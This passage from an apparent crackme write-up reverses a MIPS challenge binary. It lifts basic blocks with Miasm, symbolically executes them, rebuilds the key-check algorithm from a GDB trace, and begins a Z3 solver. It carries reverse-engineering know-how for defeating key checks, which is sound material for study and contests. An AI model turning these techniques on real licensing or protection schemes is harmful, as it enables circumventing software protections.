</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">miasm2.analysis.machine</span> <span class="kn">import</span> <span class="n">Machine</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">miasm2.analysis</span> <span class="kn">import</span> <span class="n">binary</span>
</span><span class='line'>
</span><span class='line'><span class="n">bi</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">Container</span><span class="p">(</span><span class="s">&quot;crackmips&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">machine</span> <span class="o">=</span> <span class="n">Machine</span><span class="p">(</span><span class="s">&#39;mips32l&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">mn</span><span class="p">,</span> <span class="n">dis_engine_cls</span><span class="p">,</span> <span class="n">ira_cls</span> <span class="o">=</span> <span class="n">machine</span><span class="o">.</span><span class="n">mn</span><span class="p">,</span> <span class="n">machine</span><span class="o">.</span><span class="n">dis_engine</span><span class="p">,</span> <span class="n">machine</span><span class="o">.</span><span class="n">ira</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, we open the crackme using the generic <code>Container</code> class. It automatically detects the executable format and uses <em>Elfesteem</em> to parse it. Then we use the handy <code>Machine</code> class to get references to useful classes we&rsquo;ll use to disassemble and analyze the binary.</p>

<figure class='code'><figcaption><span>miasm_example.py (2/5)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">BB_BEGIN</span> <span class="o">=</span> <span class="mh">0x00402290</span>
</span><span class='line'><span class="n">BB_END</span> <span class="o">=</span> <span class="mh">0x004022BC</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Disassemble between BB_BEGIN and BB_END</span>
</span><span class='line'><span class="n">dis_engine</span> <span class="o">=</span> <span class="n">dis_engine_cls</span><span class="p">(</span><span class="n">bs</span><span class="o">=</span><span class="n">bi</span><span class="o">.</span><span class="n">bs</span><span class="p">)</span>
</span><span class='line'><span class="n">dis_engine</span><span class="o">.</span><span class="n">dont_dis</span> <span class="o">=</span> <span class="p">[</span><span class="n">BB_END</span><span class="p">]</span>
</span><span class='line'><span class="n">bloc</span> <span class="o">=</span> <span class="n">dis_engine</span><span class="o">.</span><span class="n">dis_bloc</span><span class="p">(</span><span class="n">BB_BEGIN</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">bloc</span><span class="o">.</span><span class="n">lines</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, we disassemble a single basic block, by explicitly telling Miasm its start and end address. The disassembler is created by instantiating the <code>dis_engine_cls</code> class. <code>bi.bs</code> represents the binary stream we are working on. I admit the <code>dont_dis</code> syntax is a bit weird; it is used to tell Miasm to stop disassembling when it reaches a given address. We do it here because the next instruction is a <code>break</code>, and Miasm does not normally think it is the end of a basic block. When you run those lines, you should get this output:</p>

<figure class='code'><figcaption><span>miasm_example.py output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>LW         V1, 0x38(FP)
</span><span class='line'>SLL        V0, V1, 0x2
</span><span class='line'>ADDIU      A0, FP, 0x18
</span><span class='line'>ADDU       V0, A0, V0
</span><span class='line'>LW         A0, 0x8(V0)
</span><span class='line'>LW         V0, 0x38(FP)
</span><span class='line'>SUBU       A0, A0, V0
</span><span class='line'>SLL        V0, V1, 0x2
</span><span class='line'>ADDIU      V1, FP, 0x18
</span><span class='line'>ADDU       V0, V1, V0
</span><span class='line'>SW         A0, 0x8(V0)
</span></code></pre></td></tr></table></div></figure>


<p>Okay, so we know how to disassemble a block with Miasm. Let&rsquo;s now see how to convert it into the Intermediate Representation:</p>

<figure class='code'><figcaption><span>miasm_example.py (3/5)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Transform to IR</span>
</span><span class='line'><span class="n">ira</span> <span class="o">=</span> <span class="n">ira_cls</span><span class="p">()</span>
</span><span class='line'><span class="n">irabloc</span> <span class="o">=</span> <span class="n">ira</span><span class="o">.</span><span class="n">add_bloc</span><span class="p">(</span><span class="n">bloc</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">b</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">irabloc</span><span class="o">.</span><span class="n">irs</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>We instantiated the <code>ira_cls</code> class and called its <code>add_bloc</code> method. It takes a basic block as input and outputs a list of IR basic blocs; here we know that we&rsquo;ll get only one, so we use <code>[0]</code>. Let&rsquo;s see what is the output of those lines:</p>

<figure class='code'><figcaption><span>miasm_sample.py output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>V1 = @32[(FP+0x38)]
</span><span class='line'>V0 = (V1 &lt;&lt; 0x2)
</span><span class='line'>A0 = (FP+0x18)
</span><span class='line'>V0 = (A0+V0)
</span><span class='line'>A0 = @32[(V0+0x8)]
</span><span class='line'>V0 = @32[(FP+0x38)]
</span><span class='line'>A0 = (A0+(- V0))
</span><span class='line'>V0 = (V1 &lt;&lt; 0x2)
</span><span class='line'>V1 = (FP+0x18)
</span><span class='line'>V0 = (V1+V0)
</span><span class='line'>@32[(V0+0x8)] = A0
</span><span class='line'>IRDst = loc_00000000004022BC:0x004022bc
</span></code></pre></td></tr></table></div></figure>


<p>Each one of those lines are instructions in Miasm&rsquo;s IR language. It is pretty easy: each instruction is described as a list of side-effects it has on some variables, using expressions and affectations. <code>@32[...]</code> represents a 32-bit memory access; when it&rsquo;s on the left of an <code>=</code> sign, it&rsquo;s a <em>write</em> access, when it&rsquo;s on the right it&rsquo;s a <em>read</em>. The last line uses the pseudo-register <code>IRDst</code>, which is kind of the IR&rsquo;s <code>pc</code> register. It tells Miasm where is located the next basic block.</p>

<p>Great! Let&rsquo;s see now how to perform symbolic execution on this IR basic block.</p>

<figure class='code'><figcaption><span>miasm_example.py (4/5)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">miasm2.expression.expression</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">miasm2.ir.symbexec</span> <span class="kn">import</span> <span class="n">symbexec</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">miasm2.expression.simplifications</span> <span class="kn">import</span> <span class="n">expr_simp</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Prepare symbolic execution</span>
</span><span class='line'><span class="n">symbols_init</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">mn</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">all_regs_ids</span><span class="p">):</span>
</span><span class='line'>    <span class="n">symbols_init</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="n">mn</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">all_regs_ids_init</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Perform symbolic exec</span>
</span><span class='line'><span class="n">sb</span> <span class="o">=</span> <span class="n">symbexec</span><span class="p">(</span><span class="n">ira</span><span class="p">,</span> <span class="n">symbols_init</span><span class="p">)</span>
</span><span class='line'><span class="n">sb</span><span class="o">.</span><span class="n">emulbloc</span><span class="p">(</span><span class="n">irabloc</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">mem</span><span class="p">,</span> <span class="n">exprs</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">symbols_mem</span><span class="o">.</span><span class="n">items</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Memory changed at </span><span class="si">%s</span><span class="s"> :&quot;</span> <span class="o">%</span> <span class="n">mem</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">before:&quot;</span><span class="p">,</span> <span class="n">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">after:&quot;</span><span class="p">,</span> <span class="n">exprs</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first lines are initializing the symbol pool used for symbolic execution. We then use the <code>symbexec</code> module to create an execution engine, and we give it our fresh IR basic block. The result of the execution is readable by browsing the attributes of <code>sb.symbols</code>. Here I am mainly interested on the memory side-effects, so I use <code>symbols_mem.items()</code> to list them. <code>symbols_mem</code> is actually a dict whose keys are the memory locations that changed during execution, and values are pairs containing both the previous value that was in that memory cell, and the new one. There&rsquo;s only one change, and here it is:</p>

<figure class='code'><figcaption><span>miasm_example.py output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Memory changed at (FP_init+(@32[(FP_init+0x38)] &lt;&lt; 0x2)+0x20) :
</span><span class='line'>  before: @32[(FP_init+(@32[(FP_init+0x38)] &lt;&lt; 0x2)+0x20)]
</span><span class='line'>  after: (@32[(FP_init+(@32[(FP_init+0x38)] &lt;&lt; 0x2)+0x20)]+(- @32[(FP_init+0x38)]))
</span></code></pre></td></tr></table></div></figure>


<p>The expressions are getting a bit more complex, but still pretty readable. <code>FP_init</code> represents the value of the <code>fp</code> register at the beginning of execution. We can clearly see that a memory location as modified since a value was subtracted from it. But we can do better: we can give Miasm simplification rules in order to make this output much more readable. Let&rsquo;s do it!</p>

<figure class='code'><figcaption><span>miasm_example.py (5/5)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Simplifications</span>
</span><span class='line'><span class="n">fp_init</span> <span class="o">=</span> <span class="n">ExprId</span><span class="p">(</span><span class="s">&#39;FP_init&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'><span class="n">zero_init</span> <span class="o">=</span> <span class="n">ExprId</span><span class="p">(</span><span class="s">&#39;ZERO_init&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'><span class="n">e_i_pattern</span> <span class="o">=</span> <span class="n">expr_simp</span><span class="p">(</span><span class="n">ExprMem</span><span class="p">(</span><span class="n">fp_init</span> <span class="o">+</span> <span class="n">ExprInt32</span><span class="p">(</span><span class="mh">0x38</span><span class="p">),</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'><span class="n">e_i</span> <span class="o">=</span> <span class="n">ExprId</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'><span class="n">e_pass_i_pattern</span> <span class="o">=</span> <span class="n">expr_simp</span><span class="p">(</span><span class="n">ExprMem</span><span class="p">(</span><span class="n">fp_init</span> <span class="o">+</span> <span class="p">(</span><span class="n">e_i</span> <span class="o">&lt;&lt;</span> <span class="n">ExprInt32</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="n">ExprInt32</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'><span class="n">e_pass_i</span> <span class="o">=</span> <span class="n">ExprId</span><span class="p">(</span><span class="s">&quot;pwd[i]&quot;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">simplifications</span> <span class="o">=</span> <span class="p">{</span><span class="n">e_i_pattern</span>      <span class="p">:</span> <span class="n">e_i</span><span class="p">,</span>
</span><span class='line'>                   <span class="n">e_pass_i_pattern</span> <span class="p">:</span> <span class="n">e_pass_i</span><span class="p">,</span>
</span><span class='line'>                   <span class="n">zero_init</span>        <span class="p">:</span> <span class="n">ExprInt32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">my_simplify</span><span class="p">(</span><span class="n">expr</span><span class="p">):</span>
</span><span class='line'>    <span class="n">expr2</span> <span class="o">=</span> <span class="n">expr</span><span class="o">.</span><span class="n">replace_expr</span><span class="p">(</span><span class="n">simplifications</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">expr2</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s"> = </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">my_simplify</span><span class="p">(</span><span class="n">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">,</span><span class="n">my_simplify</span><span class="p">(</span><span class="n">exprs</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we declare 3 replacement rules:</p>

<ul>
<li>Replace <code>@32[(FP_init+0x38)]</code> with <code>i</code></li>
<li>Replace <code>@32[(FP_init+(i &lt;&lt; 0x2)+0x20)]</code> with <code>pwd[i]</code></li>
<li>Replace <code>ZERO_init</code> with 0 (although it is not really useful here)</li>
</ul>


<p>There is actually a more generic way to do it using pattern matching rules with jokers, but we don&rsquo;t really need this machinery here. This the result we get after simplification:</p>

<figure class='code'><figcaption><span>miasm_example.py final output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>pwd[i] = (pwd[i]+(- i))
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s all! So all this basic block does is a subtraction. What is nice is that the output is actually valid Python code :). This will be very useful in the last part.</p>

<h3>Generating the child&rsquo;s algorithm</h3>

<p>So in less than 60 lines, we were able to disassemble an arbitrary basic block, perform symbolic execution on it and get a pretty understandable result. We just need to apply this logic to the 100 remaining blocks, and we&rsquo;ll have a pythonic version of each one of them. Then, we simply reorder them using the GDB trace we got from the previous part, and we&rsquo;ll be able to generate 606 python lines describing the whole algorithm.</p>

<p>Here is an extract of the script automating all of this:</p>

<figure class='code'><figcaption><span>miasm_symbexec.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">load_trace</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">boundaries_from_trace</span><span class="p">(</span><span class="n">trace</span><span class="p">):</span>
</span><span class='line'>    <span class="n">bb_starts</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">trace</span><span class="p">))</span>
</span><span class='line'>    <span class="n">boundaries</span> <span class="o">=</span> <span class="p">[(</span><span class="n">bb_starts</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">bb_starts</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">bb_starts</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)]</span>
</span><span class='line'>    <span class="n">boundaries</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="mh">0x4039DC</span><span class="p">,</span> <span class="mh">0x04039E8</span><span class="p">))</span> <span class="c"># last basic bloc, added by hand</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">boundaries</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">exprs2str</span><span class="p">(</span><span class="n">exprs</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39; = &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">exprs</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">trace</span> <span class="o">=</span> <span class="n">load_trace</span><span class="p">(</span><span class="s">&quot;gdb_trace.txt&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">boundaries</span> <span class="o">=</span> <span class="n">boundaries_from_trace</span><span class="p">(</span><span class="n">trace</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;# Building IR blocs &amp; expressions for all basic blocks&quot;</span>
</span><span class='line'><span class="n">bb_exprs</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="k">for</span> <span class="n">zone</span> <span class="ow">in</span> <span class="n">boundaries</span><span class="p">:</span>
</span><span class='line'>    <span class="n">bb_exprs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">analyse_bb</span><span class="p">(</span><span class="o">*</span><span class="n">zone</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;# Reconstructing the whole algorithm based on GDB trace&quot;</span>
</span><span class='line'><span class="n">bb_starts</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">boundaries</span><span class="p">]</span>
</span><span class='line'><span class="k">for</span> <span class="n">bb_ea</span> <span class="ow">in</span> <span class="n">trace</span><span class="p">:</span>
</span><span class='line'>    <span class="n">bb_index</span> <span class="o">=</span> <span class="n">bb_starts</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">bb_ea</span><span class="p">)</span>
</span><span class='line'>    <span class="c">#print &quot;%x : %s&quot; % (bb_ea, exprs2str(bb_exprs[bb_index]))</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">exprs2str</span><span class="p">(</span><span class="n">bb_exprs</span><span class="p">[</span><span class="n">bb_index</span><span class="p">])</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>analyse_bb()</code> function perform symbolic execution on a single basic block, given its start and end addresses. This is just wrapping what we&rsquo;ve been doing so far into a function. The GDB trace is opened, parsed, and a list of basic block addresses is built from it (we cheat a little bit for the last one of the loop, by hardcoding it). Each basic block is analyzed and the resulting expressions are pushed into the <code>bb_exprs</code> list. Then the GDB trace is processed, by outputting the expressions corresponding to each basic block.</p>

<p>This is what we get:</p>

<figure class='code'><figcaption><span>output_algo.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Building IR blocs &amp; expressions for all basic blocks</span>
</span><span class='line'><span class="c"># Reconstructing the whole algorithm based on GDB trace</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="o">-</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x0</span><span class="o">|</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">^</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mh">0x3ECA6F23</span><span class="p">)</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mh">0x6EDC032</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="o">...</span><span class="p">]</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mh">0x14</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mh">0xC</span><span class="p">))</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0x1F</span><span class="p">))</span><span class="o">|</span><span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">((((</span><span class="mh">0x0</span><span class="o">|</span><span class="n">i</span><span class="p">)</span><span class="o">^</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0x1F</span><span class="p">)))</span>
</span><span class='line'><span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Solving with Z3</h2>

<p>Okay, so now we have a Python (and even C ;) file describing the operations performed on the 6 dwords containing the input key. We could try to bruteforce it, but using a constraint solver is much more elegant and faster. I also chose Z3 because it has nice Python bindings. And since its expression syntax is mostly compatible with Python, we just need to add a few things to our generated file!</p>

<figure class='code'><figcaption><span>sample_solver.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">solution_str</span> <span class="o">=</span> <span class="s">&quot;[ Synacktiv + NSC = &lt;3 ]&quot;</span>
</span><span class='line'><span class="n">solutions</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&quot;&lt;LLLLLL&quot;</span><span class="p">,</span> <span class="n">solution_str</span><span class="p">)</span>
</span><span class='line'><span class="n">N</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">solutions</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Hook Z3&#39;s `&gt;&gt;` so it works with our algorithm</span>
</span><span class='line'><span class="c"># (logical shift instead of arithmetic one)</span>
</span><span class='line'><span class="n">BitVecRef</span><span class="o">.</span><span class="n">__rshift__</span>  <span class="o">=</span> <span class="n">LShR</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwd</span> <span class="o">=</span> <span class="p">[</span><span class="n">BitVec</span><span class="p">(</span><span class="s">&quot;pwd_</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
</span><span class='line'><span class="n">pwd_orig</span> <span class="o">=</span> <span class="p">[</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
</span><span class='line'><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
